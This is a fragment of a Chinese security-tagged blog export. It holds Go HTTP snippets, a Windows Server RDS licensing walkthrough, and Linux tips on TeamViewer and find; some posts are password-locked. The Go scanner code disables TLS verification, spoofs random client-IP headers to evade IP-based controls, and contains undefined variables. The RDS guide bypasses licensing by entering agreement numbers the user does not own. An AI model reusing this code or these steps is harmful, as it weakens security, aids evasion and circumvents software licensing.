    <content type="text"><![CDATA[QQ群：397745473 判断是否包含某些字符12345678910111213package mainimport ( "fmt" "strings")func main() &#123; fmt.Println(strings.Contains("seafood", "foo")) fmt.Println(strings.Contains("seafood", "bar")) fmt.Println(strings.Contains("seafood", "")) fmt.Println(strings.Contains("", ""))&#125; https://golang.org/pkg/strings/#Contains 写文件12345678910111213func writeDate(writeContent string) &#123; resultFile := time.Now().Format("../result_20060102.txt") outFd, err := os.OpenFile(resultFile, os.O_APPEND|os.O_WRONLY, 0600) if err != nil &#123; outFd, err = os.Create(resultFile) //return &#125; defer outFd.Close() outWriter := bufio.NewWriter(outFd) _, _ = outWriter.WriteString(writeContent + "\n") _ = outWriter.Flush()&#125; 字符串分片1domain1 = strings.Split(domain, &quot;//&quot;)[1] http head请求12345678910111213141516171819func Head(url string) (resp *http.Response, err error) &#123; transCfg := &amp;http.Transport&#123; TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;, // disable verify &#125; Client := &amp;http.Client&#123; Timeout: 10 * time.Second, Transport: transCfg, &#125; req, err := http.NewRequest(&quot;HEAD&quot;, url, nil) if err != nil &#123; return nil, err &#125; req.Header.Add(&quot;User-Agent&quot;, fake.UserAgent()) resp, err2 := Client.Do(req) return resp, err2&#125; http GET 请求123456789101112131415161718192021222324func Get(url string) (content []byte, header http.Header, err error) &#123; transCfg := &amp;http.Transport&#123; TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;, // disable verify &#125; Client := &amp;http.Client&#123; Timeout: 10 * time.Second, Transport: transCfg, &#125; req, err := http.NewRequest(&quot;GET&quot;, url, nil) if err != nil &#123; return nil, nil, err &#125; req.Header.Add(&quot;User-Agent&quot;, fake.UserAgent()) resp, err2 := Client.Do(req) if err2 != nil &#123; return nil, nil, err &#125; defer resp.Body.Close() bytes, _ := ioutil.ReadAll(resp.Body) return bytes, resp.Header, nil&#125; 代理请求12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152func genIpaddr() string &#123; rand.Seed(time.Now().Unix()) ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)) return ip&#125;// func getUrlResponse(Referer, requestURL string) string &#123;func getUrlResponse(url string) (content []byte, header http.Header, err error) &#123; //fmt.Println("requestURL:", requestURL) //fmt.Println("Referer:", Referer) randIp := genIpaddr() SocksProxy, _ := cfg.GetValue("scan", "SocksProxy") //SocksProxy proxy := func(_ *http.Request) (*url.URL, error) &#123; return url.Parse(SocksProxy) &#125; httpTransport := &amp;http.Transport&#123; //解决x509: certificate signed by unknown authority TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;, Proxy: proxy, &#125; httpClient := &amp;http.Client&#123; Timeout: time.Second * 15, //超时时间 Transport: httpTransport, //解决x509: certificate signed by unknown authority &#125; // req, err := http.NewRequest("GET", requestURL, nil) req, err := http.NewRequest("GET", url, nil) if err != nil &#123; return nil, nil, err &#125; req.Header.Set("Connection", "keep-alive") req.Header.Set("User-Agent", fake.UserAgent()) req.Header.Set("X-Forward-For", randIp) req.Header.Set("HTTP_X_FORWARD_FOR", randIp) req.Header.Set("HTTP_CLIENT_IP", randIp) req.Header.Set("X-Real-IP", randIp) req.Header.Set("REMOTE_ADDR", randIp) req.Header.Set("Referer", Referer) resp, err2 := Client.Do(req) if err2 != nil &#123; return nil, nil, err &#125; defer resp.Body.Close() bytes, _ := ioutil.ReadAll(resp.Body) return bytes, resp.Header, nil&#125; 异常处理12345defer func() &#123; if err := recover();err != nil &#123; //fmt.Println(&quot;panic recover&quot;,err) &#125; &#125;() QQ群：397745473]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows2012远程终端人数修改]]></title>
    <url>%2F2019%2F12%2F24%2F109_windows%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E4%BA%BA%E6%95%B0%E9%99%90%E5%88%B6%E4%BF%AE%E6%94%B9%2F</url>
    <content type="text"><![CDATA[windows2012远程终端人数修改 windows server 2012/2016服务器设置多人同时远程桌面方法 这篇文章主要介绍了windows server 2012/2016 设置多用户远程桌面设置方法，服务器设置多用户同时远程桌面，可以提高访问效率，避免人多抢登服务器,需要的朋友可以参考下 服务器设置多用户同时远程桌面，可以提高访问效率，避免人多抢登服务器。 解决这个问题网上找了很久,有的是是连接里加/admin 强制连上去,有的改组策略,没有得到完美解决. 现在记录一下我的最终解决过程 QQ群：397745473 1. 首先需要先安装远程桌面服务 配置组策略， 运行框输入gpedit.msc， 打开 计算机配置–&gt;管理模板—&gt;windows组件—&gt;然后在右边的菜单中选择远程桌面服务； 双击打开。 双击远程桌面会话主机-&gt;连接，点击限制连接的数量，设置如下。 这样设置就完成了,亲测成功。网上大部份都是解决到这里就没有了. 但这样设置远程多用户只有120天期限，要破解120天限制，还需要配置远程桌面授权。能成功的前提：系统是激活的。 (网上查到说要删个注册表把时间改到2099年解决的,但还是没有解决，只是提示时间变长了而已.) 2. web申请激活码1) 管理工具—远程桌面服务—远程桌面授权管理器，选择未激活的服务器，选择”属性”， 请记下对话框中出现的产品ID,我们要用这20位的ID号到网上注册 例如：00184-50100-21572-AT706注意：如果终端服务器授权中没有服务器，请选择连接，然后输入本机服务器IP地址。 必需信息，如图下填写: 2) 打开Internet Explorer浏览器, 在地址栏中输入 https://activate.microsoft.com 这个地址，此时是英文界面。 选择 Chinese (Simplified) 点 GO 3) 确保已选中”启用许可证服务器”项，再单击”下一步”按钮 4) 在随后要求提供的信息界面中，”产品ID”处输入刚才抄下的那个20位数字，再填写刚才步骤1中必需信息，然后再选”下一步”继续。 5) 可以得到”已成功处理您的许可证服务器启动申请。你的许可证ID是：…”， 又是一个需要抄下的分为七段的35位数，里面包含有数字也有大写的英文字母； 并且还会问你”需要此时获取客户机许可证吗 ” 选择 ”是”许可服务器ID：CCB9Q-Y44D6-BR2HD-9H4VM-YPXMM-KF2KJ-RJ473 6) 如果没有许可证，那么许可证程序选择“企业协议”，确定您的信息后,便可继续”下一步”； 7) “产品类型”一项应为”Windows 2003终端服务客户端访问许可证”； ”数量” 为你欲连接的最大用户数（比如为”500”）； 在”注册号码”中输入你从微软获得的那个七位数 （如果自己没有许可证，那么就输入6565792,4954438,6879321或者5296992）， 再”下一步”；注意：建议选择Windwos Server 2012远程桌面服务器每用户访问许可。 8) 下一步 9) 记录前面的35位数的”许可证服务器ID”，一个是现在才取得的另一个七段共35位数的”许可证密钥包ID”。 许可密钥ID：RBG28-9884M-GXC4V-WKXGJ-8QPXG-FG8YP-9RV8Q10) 选择结束 3. 激活终端服务1) 管理工具—远程桌面服务—远程桌面授权管理器，选择服务器名称后点击右键, 将”属性”中的”安装方法”设为”Web浏览器”； 2) 再选择服务器,点击右键,选择”激活许可”； 3) 下一步 4) 选择WEB 5) 输入许可服务器ID：CCB9Q-Y44D6-BR2HD-9H4VM-YPXMM-KF2KJ-RJ473 6) 选择立即启动许可安装向导，下一步 7) 下一步8) 输入许可密钥ID：RBG28-9884M-GXC4V-WKXGJ-8QPXG-FG8YP-9RV8Q 9) 点击完成 4. 配置远程桌面会话主机授权服务器1） 管理工具—远程桌面服务—RD授权诊断程序，查看当前服务器为没有授权 2） 运行—&gt;gpedit.msc-&gt; 计算机配置—管理模板—windows组件—远程桌面服务—远程桌面会话主机—-授权， 找到 “使用指定的远程桌面许可服务器”，设置为启用，并在“要使用的许可证服务器”中， 设置当前服务器的IP或者主机名。 9）运行—&gt;gpedit.msc-&gt;计算机配置—管理模板—windows组件—终端服务 找到 “限制连接数量”， 设置为Disable,即禁用或者未配置。也可以设置具体数量. 5. 配置远程桌面会话主机授权模式1） 管理工具—远程桌面服务—RD授权诊断程序，查看当前服务器授权为02） 运行—&gt;gpedit.msc-&gt;计算机配置—管理模板—windows组件—远程桌面服务—远程桌面会话主机—-授权， 找到 “设置远程桌面授权模式”，设置为启用，并在“指定RD 会话主机服务器授权模式”中，选择“按用户”。 3） 重新打开RD授权诊断程序 6. 配置远程桌面会话主机连接1) 运行—&gt;gpedit.msc-&gt;计算机配置—管理模板—windows组件—远程桌面服务—远程桌面会话主机—-连接， 可以在“限制连接的数量”中设置最大连接数量（默认无限制）。 2) 设置一个用户是否可以使用多个远程桌面连接。选择“将远程桌面服务限制到单独的远程桌面会话”， 这里必须设置禁用，否则一个用户只能连接一个远程桌面。 更多参考: 使用远程桌面链接登录到终端服务器时经常会遇到“终端服务器超出最大允许链接数”诸如此类错误导致无法正常登录终端服务器，引起该问题的原因在于终端服务的缺省链接数为2个链接，并且当登录远程桌面后如果不是采用注销方式退出，而是直接关闭远程桌面窗口，那么实际上会话并没有释放掉，而是继续保留在服务器端，这样就会占用总的链接数，当这个数量达到最大允许值时就会出现上面的提示。 解决方式： 一、用注销来退出远程桌面而不是直接关闭窗口 二、限制已断开链接的会话存在时间 三、增加最多链接数，即设置可连接的数量多些 修改完后还是不可以同时在线多个用户,需参考下面这篇继续修改服务器 Windows 2012 R2設定同一使用者(2人使用相同使用者賬號登入)同時多點遠端系統（Win2016 Win2008R2 類似） 原文链接: https://www.itread01.com/content/1549212134.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475說明：Windows Server 2012預設情況下，只執行2個使用者遠端桌面登陸，這裡我們可以通過安裝遠端桌面會話主機配置來實現2個以上使用者的遠端桌面登陸。1、 安裝桌面會話主機和遠端桌面授權 1）在“控制面板”中，開啟“伺服器管理器”，選擇“基於角色或基於功能的安裝”，出現以下的安裝介面 2) 下一步 3) 選擇遠端桌面服務 4) 下一步 5) 下一步 6) 選擇 桌面會話主機和遠端桌面授權 7) 選擇安裝 8) 重新啟動後設置便會生效。2、 web申請啟用碼1) 管理工具---遠端桌面服務---遠端桌面授權管理器，選擇未啟用的伺服器，選擇”屬性”，請記下對話方塊中出現的產品ID,我們要用這20位的ID號到網上註冊例如：00184-50100-21572-AT706 注意：如果終端伺服器授權中沒有伺服器，請選擇連線，然後輸入本機伺服器IP地址。 必需資訊，如圖下填寫： 2) 開啟Internet Explorer瀏覽器,在位址列中輸入https://activate.microsoft.com這個地址，此時是英文介面。選擇GO 3) 確保已選中&quot;啟用許可證伺服器&quot;項，再單擊&quot;下一步&quot;按鈕。 4) 在隨後要求提供的資訊介面中，&quot;產品ID&quot;處輸入剛才抄下的那個20位數字，再填寫剛才步驟1中必需資訊，然後再選&quot;下一步&quot;繼續。 5) 可以得到&quot;已成功處理您的許可證伺服器啟動申請。你的許可證ID是：…&quot;，又是一個需要抄下的分為七段的35位數，裡面包含有數字也有大寫的英文字母；並且還會問你&quot;需要此時獲取客戶機許可證嗎？&quot;選擇”是” 許可伺服器ID：CCB9Q-Y44D6-BR2HD-9H4VM-YPXMM-KF2KJ-RJ473 6) 如果沒有許可證，那麼許可證程式選擇“企業協議”，確定您的資訊後,便可繼續”下一步”； 7) &quot;產品型別&quot;一項應為&quot;Windows 2003終端服務客戶端訪問許可證&quot;；&quot;數量&quot;為你欲連線的最大使用者數（比如為&quot;500&quot;）；在&quot;註冊號碼&quot;中輸入你從微軟獲得的那個七位數（如果自己沒有許可證，那麼就輸入6565792,4954438,6879321或者5296992），再&quot;下一步&quot;； 注意：建議選擇Windwos Server 2012遠端桌面伺服器每使用者訪問許可。 8) 下一步 9) 記錄前面的35位數的&quot;許可證伺服器ID&quot;，一個是現在才取得的另一個七段共35位數的&quot;許可證金鑰包ID&quot;。 許可金鑰ID：RBG28-9884M-GXC4V-WKXGJ-8QPXG-FG8YP-9RV8Q10) 選擇結束3、 啟用終端服務1) 1) 管理工具---遠端桌面服務---遠端桌面授權管理器，選擇伺服器名稱後點擊右鍵,將”屬性”中的”安裝方法”設為”Web瀏覽器”； 2) 再選擇伺服器,點選右鍵,選擇”啟用許可”； 3) 下一步 4) 選擇WEB 5) 輸入許可伺服器ID：CCB9Q-Y44D6-BR2HD-9H4VM-YPXMM-KF2KJ-RJ473 6) 選擇立即啟動許可安裝嚮導，下一步 7) 下一步 8) 輸入許可金鑰ID：RBG28-9884M-GXC4V-WKXGJ-8QPXG-FG8YP-9RV8Q 9) 點選完成 4、 配置遠端桌面會話主機授權伺服器1） 管理工具---遠端桌面服務---RD授權診斷程式，檢視當前伺服器為沒有授權 2） 執行—&gt;gpedit.msc-&gt;計算機配置---管理模板---windows元件---遠端桌面服務---遠端桌面會話主機----授權， 找到 “使用指定的遠端桌面許可伺服器”，設定為啟用，並在“要使用的許可證伺服器”中，設定當前伺服器的IP或者主機名。9）執行—&gt;gpedit.msc-&gt;計算機配置---管理模板---windows元件---終端服務 找到 “限制連線數量”，設定為Disable,即禁用或者未配置。也可以設定具體數量，如圖：5、配置遠端桌面會話主機授權模式3） 管理工具---遠端桌面服務---RD授權診斷程式，檢視當前伺服器授權為0 4） 執行—&gt;gpedit.msc-&gt;計算機配置---管理模板---windows元件---遠端桌面服務---遠端桌面會話主機----授權， 找到 “設定遠端桌面授權模式”，設定為啟用，並在“指定RD 會話主機伺服器授權模式”中，選擇“按使用者”。 5） 重新開啟RD授權診斷程式 6、配置遠端桌面會話主機連線1) 執行—&gt;gpedit.msc-&gt;計算機配置---管理模板---windows元件---遠端桌面服務---遠端桌面會話主機----連線，可以在“限制連線的數量”中設定最大連線數量（預設無限制）。如圖 2) 設定一個使用者是否可以使用多個遠端桌面連線。選擇“將遠端桌面服務限制到單獨的遠端桌面會話”，這裡必須設定禁用，否則一個使用者只能連線一個遠端桌面。 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vps 日常操作记录]]></title>
    <url>%2F2019%2F12%2F24%2F110_VPS%E6%97%A5%E5%B8%B8%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装teamviewer]]></title>
    <url>%2F2019%2F12%2F17%2F107_Ubuntu%E5%AE%89%E8%A3%85teamviewer%2F</url>
    <content type="text"><![CDATA[Ubuntu Debian 安装teamviewer Debian 安装桌面环境参考： https://blog.csdn.net/heyangyi_19940703/article/details/77994416 12sudo apt-get -y install xfce4 xrdp vnc4serverecho xfce4-session&gt;.xsession 连接时报错 解决方案 : 123apt-get purge tightvnc xrdpapt-get install tightvncserver xrdpsudo /etc/init.d/xrdp restart QQ群：397745473 有时候我们需要远程操控ubuntu电脑，teamviewer 一直是不错的选项。本以为用dpkg命令应该很容易装上，中途却是出现了错误，特此记录下来： 1、首先去官网 https://www.teamviewer.com/zhcn/download/linux/下载了相应的安装包 2、安装下好的deb包，执行命令： sudo dpkg -i teamviewer_13.0.9865_amd64.deb 出现问题了~~，缺少依赖还是啥的 忘了。 然后执行下面命令(用apt而非apt-get可以看到进度条，心安 哈哈)： 12sudo apt install -fsudo apt install teamviewer_13.0.9865_amd64.deb （一直也很疑惑，可是亲测有效） 安装成功！！ 若要卸载teamviewer执行: 1apt purge teamviewer 常用命令12teamViewer --info # 查IDteamviewer --passwd newPassword # 改密码 原文链接：https://blog.csdn.net/yjt1325/article/details/79656040 QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速搭建Golang扫描环境]]></title>
    <url>%2F2019%2F12%2F06%2F106_%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAGolang%E6%89%AB%E6%8F%8F%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux复制文件修改文件时间]]></title>
    <url>%2F2019%2F12%2F05%2F105_linux%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find的高级用法]]></title>
    <url>%2F2019%2F12%2F03%2F104_find%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[find的高级用法 在linux命令中用find可以做很多事。 inux的终端上，没有windows的搜索那样好用的图形界面工具，但find命令确是很强大的。 比如按名字查找一个文件，可以用 find / -name targetfilename 。 唉，如果只知道名字，不知道地点，这样也不失为一个野蛮有效的方法。 按时间查找也有参数 -atime 访问时间 -ctime 改变状态的时间 -mtime修改的时间。但要注意，这里的时间是以24小时为单位的。 查看man手册后使用，你会很迷惑： -mtime n： Files data was last modified n*24 hours ago. 字面上的理解是最后一次修改发生在n个24小时以前的文件，但实际上 find ./ -mtime 0：返回最近24小时内修改过的文件。 find ./ -mtime 1 ： 返回的是前48~24小时修改过的文件。而不是48小时以内修改过的文件。 那怎么返回10天内修改过的文件？find还可以支持表达式关系运算，所以可以把最近几天的数据一天天的加起来： find ./ -mtime 0 -o -mtime 1 -o -mtime 2 ……虽然比较土，但也算是个方法了。 还有没有更好的方法，我也想知道。 另外， -mmin参数-cmin / - amin也是类似的。 QQ群：397745473 Find应用实例查找最近30分钟修改的当前目录下的.php文件 1find . -name '*.php' -mmin -30 查找最近24小时修改的当前目录下的.php文件 1find . -name '*.php' -mtime 0 查找最近24小时修改的当前目录下的.php文件，并列出详细信息 1find . -name '*.inc' -mtime 0 -ls 查找当前目录下，最近24-48小时修改过的常规文件。 1find . -type f -mtime 1 查找当前目录下，最近1天前修改过的常规文件。 1find . -type f -mtime +1 ·find path -option [ -print ] [ -exec -ok command ] {} \;find命令的参数； pathname: find命令所查找的目录路径。例如用.来表示当前目录，用/来表示系统根目录。-print： find命令将匹配的文件输出到标准输出。-exec： find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ { } \;，注意{ }和\；之间的空格。-ok： 和-exec的作用相同，只不过以一种更为安全的模式来执行该参数所给出的shell命令，在执行每一个命令之前，都会给出提示，让用户来确定是否执行。 #-print 将查找到的文件输出到标准输出#-exec command {} \; —–将查到的文件执行command操作,{} 和 \;之间有空格#-ok 和-exec相同，只不过在操作前要询用户 例：find . -name .svn | xargs rm -rf 参考： https://www.cnblogs.com/hechunhua/p/4860544.html QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派或debian的vim右键进入visual模式]]></title>
